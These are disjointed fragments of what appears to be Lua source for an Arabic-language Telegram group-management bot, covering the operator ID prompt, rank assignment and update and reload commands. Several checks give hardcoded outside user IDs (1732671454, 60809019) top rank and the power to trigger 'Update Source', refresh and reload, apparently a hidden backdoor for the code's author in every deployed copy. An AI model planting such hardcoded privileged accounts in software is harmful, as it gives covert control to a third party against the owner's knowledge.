...
io.write('\n\27[1;33m￤الحين دخل ايدي آلمـطـور  ↓  \n￤Enter your ID SUDO : \27[0;39;49m')
...
if msg.sender_user_id_ == 1732671454 or msg.sender_user_id_ == 60809019  then 
...
msg.TheRank = redis:get(boss..":RtbaNew5:"..msg.chat_id_) or ' مدير '
msg.Rank = 4
...
msg.TheRank = redis:get(boss..":RtbaNew6:"..msg.chat_id_) or 'ادمن '
msg.Rank = 5
...
if (msg.text=="تحديث" or msg.text=="we" or msg.text=="حدث") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 00090 or msg.sender_user_id_ == 1732671454) then
return sendMsg(msg.chat_id_,msg.id_," ابشر ",function(arg,data)
Refresh_Start = true
end)
end 
if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1732671454 or msg.sender_user_id_ == 1732671454) then
UpdateSource(msg)
...
if (msg.text == 'reload' or msg.text == "أعادة التشغيل 🔌") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 00090 or msg.sender_user_id_ == 1732671454) then
